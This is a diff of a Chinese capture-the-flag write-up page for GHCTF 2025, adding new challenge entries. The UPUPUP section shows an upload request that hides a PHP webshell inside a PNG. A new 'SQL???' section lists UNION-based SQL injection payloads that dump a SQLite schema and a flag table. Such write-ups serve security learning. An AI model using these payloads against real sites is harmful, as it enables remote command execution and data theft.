@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/GHCTF-2025/image-20250707175141502.png">
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/GHCTF-2025/image-20250708170318059.png">
 <meta property="article:published_time" content="2025-06-13T02:50:19.000Z">
-<meta property="article:modified_time" content="2025-07-08T09:03:22.028Z">
+<meta property="article:modified_time" content="2025-07-09T12:09:16.583Z">
 <meta property="article:author" content="wArn">
 <meta property="article:tag" content="CTFwp">
 <meta name="twitter:card" content="summary">
@@ -140,7 +140,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezzzz-pickle"><span class="toc-number">1.</span> <span class="toc-text">ezzzz_pickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Popppppp"><span class="toc-number">2.</span> <span class="toc-text">Popppppp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Escape%EF%BC%81"><span class="toc-number">3.</span> <span class="toc-text">Escape！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-SSTI"><span class="toc-number">4.</span> <span class="toc-text">upload?SSTI!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">5.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UPUPUP"><span class="toc-number">6.</span> <span class="toc-text">UPUPUP</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezzzz-pickle"><span class="toc-number">1.</span> <span class="toc-text">ezzzz_pickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Popppppp"><span class="toc-number">2.</span> <span class="toc-text">Popppppp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Escape%EF%BC%81"><span class="toc-number">3.</span> <span class="toc-text">Escape！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-SSTI"><span class="toc-number">4.</span> <span class="toc-text">upload?SSTI!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">5.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UPUPUP"><span class="toc-number">6.</span> <span class="toc-text">UPUPUP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">7.</span> <span class="toc-text">SQL???</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-readfile"><span class="toc-number">8.</span> <span class="toc-text">ez_readfile</span></a></li></ol>
       </div>
     
   </span>
@@ -167,7 +167,7 @@
       
         <time datetime="2025-06-13T02:50:19.000Z" class="dt-published" itemprop="datePublished">2025-06-13</time>
         
-        (Updated: <time datetime="2025-07-08T09:03:22.028Z" class="dt-updated" itemprop="dateModified">2025-07-08</time>)
+        (Updated: <time datetime="2025-07-09T12:09:16.583Z" class="dt-updated" itemprop="dateModified">2025-07-09</time>)
         
       
     </div>
@@ -348,7 +348,7 @@
 <p>wc命令的–files0-from参数可以读取以空字符终止的文件名，然后统计文件的内容；如果没有这个文件，发生报错，就可以泄露出文件内容。</p>
 <img src="/CTFwp/GHCTF-2025/image-20250707175141502.png" class="" title="image-20250707175141502">
 
-<h2 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h2><p>文件上传漏洞，当我们修改后缀，以及comment-Type后，显示还是非法文件，其肯定检测了文件内容，我们先上传一个图片马：</p>
+<h2 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h2><p>文件上传漏洞，当我们修改后缀，以及content-Type后，显示还是非法文件，其肯定检测了文件内容，我们先上传一个图片马：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary2AjUVhA32p43CAAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&#123;&#123;unquote(&quot;\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00\xfc\x18\xed\xa3\x00\x00\x00\x09pHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00`IDATH\x89c\\&lt;?=$_GET[0]\x28$_POST[1]\x29;?&gt;X\x80\x81\x81\xc1s^7\x93\xfc\x8f\x8b\xdb~_\xd3\x7d\xaa&#x27;\xf7\xf1\xe3\xc9\xbf_\xef\x06|\xb200c\xd9\xb9g\xfd\xd9=\x1b\xce2\x8c\x82Q0\x0aF\xc1\x28\x18\x05\xa3`\x14\x8c\x82Q0\x0a\x86\x0d\x00\x00\x81\xb2\x1b\x02\x07x\x0d\x0c\x00\x00\x00\x00IEND\xaeB`\x82&quot;)&#125;&#125;</span><br><span class="line">------WebKitFormBoundary2AjUVhA32p43CAAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundary2AjUVhA32p43CAAA--</span><br></pre></td></tr></table></figure>
 
 <p>接着就是想办法解析它，<code>Server: Apache/2.4.54 (Debian)</code>，我们可以上传.htaccess文件，解析文件内容：</p>
@@ -359,6 +359,11 @@
 
 <p>可以设置高度和宽度来绕过检测；接下来就是命令执行：</p>
 <img src="/CTFwp/GHCTF-2025/image-20250708170318059.png" class="" title="image-20250708170318059">
+
+<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p>过滤了 单引号和双引号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 order by 5 --+  有5列</span><br><span class="line"></span><br><span class="line">1 union select 1,2,3,4,(select group_concat(sql) from sqlite_master) --+</span><br><span class="line"></span><br><span class="line">-- 出现这个 CREATE TABLE &quot;flag&quot; ( &quot;flag&quot; TEXT ), CREATE TABLE &quot;users&quot; ( &quot;id&quot; INTEGER, &quot;username&quot; TEXT, &quot;email&quot; TEXT, &quot;phone&quot; TEXT, &quot;address&quot; TEXT )</span><br><span class="line"></span><br><span class="line">-- 读取数据</span><br><span class="line">1 union select 1,2,3,4,(select group_concat(flag) from flag) --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h2>
   </div>
 </article>
 
@@ -393,7 +398,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezzzz-pickle"><span class="toc-number">1.</span> <span class="toc-text">ezzzz_pickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Popppppp"><span class="toc-number">2.</span> <span class="toc-text">Popppppp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Escape%EF%BC%81"><span class="toc-number">3.</span> <span class="toc-text">Escape！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-SSTI"><span class="toc-number">4.</span> <span class="toc-text">upload?SSTI!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">5.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UPUPUP"><span class="toc-number">6.</span> <span class="toc-text">UPUPUP</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezzzz-pickle"><span class="toc-number">1.</span> <span class="toc-text">ezzzz_pickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Popppppp"><span class="toc-number">2.</span> <span class="toc-text">Popppppp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Escape%EF%BC%81"><span class="toc-number">3.</span> <span class="toc-text">Escape！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-SSTI"><span class="toc-number">4.</span> <span class="toc-text">upload?SSTI!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">5.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UPUPUP"><span class="toc-number">6.</span> <span class="toc-text">UPUPUP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">7.</span> <span class="toc-text">SQL???</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-readfile"><span class="toc-number">8.</span> <span class="toc-text">ez_readfile</span></a></li></ol>
       </div>
     
 
